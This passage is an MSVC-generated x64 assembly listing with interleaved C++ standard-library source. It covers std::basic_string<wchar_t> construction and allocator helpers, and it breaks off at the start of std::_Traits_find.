; 2674 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2675 :         } else {
; 2676 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2677 :         }
; 2678 : 
; 2679 :         if (_Count > max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	cmp	QWORD PTR _Count$[rsp], rax
	jbe	SHORT $LN2@Construct

; 2680 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Construct:

; 2681 :         }
; 2682 : 
; 2683 :         auto& _My_data  = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 2684 :         auto& _Al       = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 2685 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

	lea	rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	QWORD PTR _Alproxy$[rsp], rax

; 2686 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

	mov	r8, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR _Alproxy$[rsp]
	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2687 : 
; 2688 : #if _HAS_CXX20
; 2689 :         if (_STD is_constant_evaluated()) {
; 2690 :             _My_data._Myres = _BUF_SIZE; // TRANSITION: constexpr SSO
; 2691 :         }
; 2692 : 
; 2693 :         const bool _Stay_small = _Count < _BUF_SIZE && !_STD is_constant_evaluated();
; 2694 : #else // ^^^ _HAS_CXX20 / !_HAS_CXX20 vvv
; 2695 :         const bool _Stay_small = _Count < _BUF_SIZE;

	cmp	QWORD PTR _Count$[rsp], 8
	jae	SHORT $LN5@Construct
	mov	BYTE PTR tv79[rsp], 1
	jmp	SHORT $LN6@Construct
$LN5@Construct:
	mov	BYTE PTR tv79[rsp], 0
$LN6@Construct:
	movzx	eax, BYTE PTR tv79[rsp]
	mov	BYTE PTR _Stay_small$[rsp], al

; 2696 : #endif // _HAS_CXX20
; 2697 : 
; 2698 :         if (_Stay_small) {

	movzx	eax, BYTE PTR _Stay_small$[rsp]
	test	eax, eax
	je	SHORT $LN3@Construct

; 2699 : #if _HAS_CXX20
; 2700 :             // TRANSITION: This is currently unused until SSO support is merged
; 2701 :             if (_STD is_constant_evaluated()) {
; 2702 :                 _Construct_in_place(_My_data._Bx);
; 2703 :             }
; 2704 : #endif // _HAS_CXX20
; 2705 : 
; 2706 :             _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2707 :             _My_data._Myres  = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 2708 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2709 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2710 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2711 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2712 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2713 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2714 :             } else { // _Strat == _Construct_strategy::_From_string
; 2715 : #ifdef _INSERT_STRING_ANNOTATION
; 2716 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2717 : #else // ^^^ _INSERT_STRING_ANNOTATION ^^^ // vvv !_INSERT_STRING_ANNOTATION vvv
; 2718 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _BUF_SIZE);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	r8d, 8
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 2719 : #endif // !_INSERT_STRING_ANNOTATION
; 2720 :             }
; 2721 : 
; 2722 :             _ASAN_STRING_CREATE(*this);
; 2723 :             _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2724 :             return;

	jmp	$LN1@Construct
$LN3@Construct:

; 2725 :         }
; 2726 : 
; 2727 :         _My_data._Myres               = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 2728 :         const size_type _New_capacity = _Calculate_growth(_Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 2729 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 2730 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2731 : 
; 2732 : #if _HAS_CXX20
; 2733 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 2734 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 2735 :         }
; 2736 : #endif // _HAS_CXX20
; 2737 : 
; 2738 :         _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2739 :         _My_data._Myres  = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 2740 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2741 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2742 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2743 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2744 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2745 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2746 :         } else { // _Strat == _Construct_strategy::_From_string
; 2747 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

	mov	rax, QWORD PTR _Count$[rsp]
	inc	rax
	mov	QWORD PTR tv140[rsp], rax
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	rcx, QWORD PTR tv140[rsp]
	mov	r8, rcx
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2748 :         }
; 2749 : 
; 2750 :         _ASAN_STRING_CREATE(*this);
; 2751 :         _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2752 :     }

	add	rsp, 104				; 00000068H
	ret	0
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
tv79 = 32
_Proxy$ = 33
_Stay_small$ = 34
_My_data$ = 40
$T1 = 48
$T2 = 50
_New_ptr$ = 56
_New_capacity$ = 64
_Alproxy$ = 72
_Al$ = 80
this$ = 112
_Arg$ = 120
_Count$ = 128
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>, COMDAT

; 2672 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN7:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 2673 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2674 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2675 :         } else {
; 2676 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2677 :         }
; 2678 : 
; 2679 :         if (_Count > max_size()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
	cmp	QWORD PTR _Count$[rsp], rax
	jbe	SHORT $LN2@Construct

; 2680 :             _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
$LN2@Construct:

; 2681 :         }
; 2682 : 
; 2683 :         auto& _My_data  = _Mypair._Myval2;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _My_data$[rsp], rax

; 2684 :         auto& _Al       = _Getal();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
	mov	QWORD PTR _Al$[rsp], rax

; 2685 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

	lea	rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	QWORD PTR _Alproxy$[rsp], rax

; 2686 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

	mov	r8, QWORD PTR _My_data$[rsp]
	mov	rdx, QWORD PTR _Alproxy$[rsp]
	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2687 : 
; 2688 : #if _HAS_CXX20
; 2689 :         if (_STD is_constant_evaluated()) {
; 2690 :             _My_data._Myres = _BUF_SIZE; // TRANSITION: constexpr SSO
; 2691 :         }
; 2692 : 
; 2693 :         const bool _Stay_small = _Count < _BUF_SIZE && !_STD is_constant_evaluated();
; 2694 : #else // ^^^ _HAS_CXX20 / !_HAS_CXX20 vvv
; 2695 :         const bool _Stay_small = _Count < _BUF_SIZE;

	cmp	QWORD PTR _Count$[rsp], 8
	jae	SHORT $LN5@Construct
	mov	BYTE PTR tv79[rsp], 1
	jmp	SHORT $LN6@Construct
$LN5@Construct:
	mov	BYTE PTR tv79[rsp], 0
$LN6@Construct:
	movzx	eax, BYTE PTR tv79[rsp]
	mov	BYTE PTR _Stay_small$[rsp], al

; 2696 : #endif // _HAS_CXX20
; 2697 : 
; 2698 :         if (_Stay_small) {

	movzx	eax, BYTE PTR _Stay_small$[rsp]
	test	eax, eax
	je	SHORT $LN3@Construct

; 2699 : #if _HAS_CXX20
; 2700 :             // TRANSITION: This is currently unused until SSO support is merged
; 2701 :             if (_STD is_constant_evaluated()) {
; 2702 :                 _Construct_in_place(_My_data._Bx);
; 2703 :             }
; 2704 : #endif // _HAS_CXX20
; 2705 : 
; 2706 :             _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2707 :             _My_data._Myres  = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 2708 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2709 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2710 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2711 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2712 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 2713 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

	xor	eax, eax
	mov	WORD PTR $T1[rsp], ax
	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, rax
	call	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2714 :             } else { // _Strat == _Construct_strategy::_From_string
; 2715 : #ifdef _INSERT_STRING_ANNOTATION
; 2716 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _Count);
; 2717 : #else // ^^^ _INSERT_STRING_ANNOTATION ^^^ // vvv !_INSERT_STRING_ANNOTATION vvv
; 2718 :                 _Traits::move(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2719 : #endif // !_INSERT_STRING_ANNOTATION
; 2720 :             }
; 2721 : 
; 2722 :             _ASAN_STRING_CREATE(*this);
; 2723 :             _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2724 :             return;

	jmp	$LN1@Construct
$LN3@Construct:

; 2725 :         }
; 2726 : 
; 2727 :         _My_data._Myres               = _BUF_SIZE - 1;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	QWORD PTR [rax+24], 7

; 2728 :         const size_type _New_capacity = _Calculate_growth(_Count);

	mov	rdx, QWORD PTR _Count$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
	mov	QWORD PTR _New_capacity$[rsp], rax

; 2729 :         const pointer _New_ptr        = _Al.allocate(_New_capacity + 1); // throws

	mov	rax, QWORD PTR _New_capacity$[rsp]
	inc	rax
	mov	rdx, rax
	mov	rcx, QWORD PTR _Al$[rsp]
	call	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ; std::allocator<wchar_t>::allocate
	mov	QWORD PTR _New_ptr$[rsp], rax

; 2730 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	rax, QWORD PTR _My_data$[rsp]
	lea	rdx, QWORD PTR _New_ptr$[rsp]
	mov	rcx, rax
	call	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2731 : 
; 2732 : #if _HAS_CXX20
; 2733 :         if (_STD is_constant_evaluated()) { // Begin the lifetimes of the objects before copying to avoid UB
; 2734 :             _Traits::assign(_Unfancy(_New_ptr), _New_capacity + 1, _Elem());
; 2735 :         }
; 2736 : #endif // _HAS_CXX20
; 2737 : 
; 2738 :         _My_data._Mysize = _Count;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	QWORD PTR [rax+16], rcx

; 2739 :         _My_data._Myres  = _New_capacity;

	mov	rax, QWORD PTR _My_data$[rsp]
	mov	rcx, QWORD PTR _New_capacity$[rsp]
	mov	QWORD PTR [rax+24], rcx

; 2740 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2741 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2742 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2743 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2744 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);

	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Arg$[rsp]
	mov	rcx, rax
	call	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2745 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

	xor	eax, eax
	mov	WORD PTR $T2[rsp], ax
	mov	rcx, QWORD PTR _New_ptr$[rsp]
	call	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z	; std::_Unfancy<wchar_t>
	mov	rcx, QWORD PTR _Count$[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, rax
	call	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 2746 :         } else { // _Strat == _Construct_strategy::_From_string
; 2747 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);
; 2748 :         }
; 2749 : 
; 2750 :         _ASAN_STRING_CREATE(*this);
; 2751 :         _Proxy._Release();

	lea	rcx, QWORD PTR _Proxy$[rsp]
	call	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2752 :     }

	add	rsp, 104				; 00000068H
	ret	0
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Convert_size@_K@std@@YA_K_K@Z
_TEXT	SEGMENT
_Len$ = 8
??$_Convert_size@_K@std@@YA_K_K@Z PROC			; std::_Convert_size<unsigned __int64>, COMDAT

; 965  : _NODISCARD constexpr _Size_type _Convert_size(const size_t _Len) noexcept(is_same_v<_Size_type, size_t>) {

	mov	QWORD PTR [rsp+8], rcx

; 966  :     // convert size_t to _Size_type, avoiding truncation
; 967  :     if constexpr (!is_same_v<_Size_type, size_t>) {
; 968  :         if (_Len > (numeric_limits<_Size_type>::max)()) {
; 969  :             _Xlength_error("size_t too long for _Size_type");
; 970  :         }
; 971  :     }
; 972  : 
; 973  :     return static_cast<_Size_type>(_Len);

	mov	rax, QWORD PTR _Len$[rsp]

; 974  : }

	ret	0
??$_Convert_size@_K@std@@YA_K_K@Z ENDP			; std::_Convert_size<unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT

; 1375 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??0?$allocator@_W@std@@QEAA@XZ		; std::allocator<wchar_t>::allocator<wchar_t>
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 48
__formal$ = 56
_Val1$ = 64
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >, COMDAT

; 1380 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
	mov	QWORD PTR [rsp+24], r8
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR _Val1$[rsp]
	call	??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ; std::forward<std::allocator<wchar_t> >
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\type_traits
;	COMDAT ??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z PROC ; std::move<std::allocator<wchar_t> &>, COMDAT

; 1422 : _NODISCARD constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept { // forward _Arg as movable

	mov	QWORD PTR [rsp+8], rcx

; 1423 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

	mov	rax, QWORD PTR _Arg$[rsp]

; 1424 : }

	ret	0
??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ENDP ; std::move<std::allocator<wchar_t> &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xmemory
;	COMDAT ??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z
_TEXT	SEGMENT
_Left$ = 48
_Right$ = 56
??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z PROC ; std::_Pocma<std::allocator<wchar_t> >, COMDAT

; 928  : _CONSTEXPR20 void _Pocma(_Alloc& _Left, _Alloc& _Right) noexcept { // (maybe) propagate on container move assignment

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 929  :     if constexpr (allocator_traits<_Alloc>::propagate_on_container_move_assignment::value) {
; 930  :         _Left = _STD move(_Right);

	mov	rcx, QWORD PTR _Right$[rsp]
	call	??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ; std::move<std::allocator<wchar_t> &>

; 931  :     }
; 932  : }

	add	rsp, 40					; 00000028H
	ret	0
??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z ENDP ; std::_Pocma<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstddef
;	COMDAT ??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z
_TEXT	SEGMENT
_Val$ = 8
??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z PROC ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >, COMDAT

; 252  : _NODISCARD constexpr _Ty* addressof(_Ty& _Val) noexcept {

	mov	QWORD PTR [rsp+8], rcx

; 253  :     return __builtin_addressof(_Val);

	mov	rax, QWORD PTR _Val$[rsp]

; 254  : }

	ret	0
??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z ENDP ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z
_TEXT	SEGMENT
_Match_try$1 = 32
_Possible_matches_end$ = 40
_Haystack$ = 64
_Hay_size$ = 72
_Start_at$ = 80
_Needle$ = 88
_Needle_size$ = 96
??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z PROC ; std::_Traits_find<std::char_traits<wchar_t> >, COMDAT

; 605  :     const size_t _Needle_size) noexcept {

$LN11:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 606  :     // search [_Haystack, _Haystack + _Hay_size) for [_Needle, _Needle + _Needle_size), at/after _Start_at
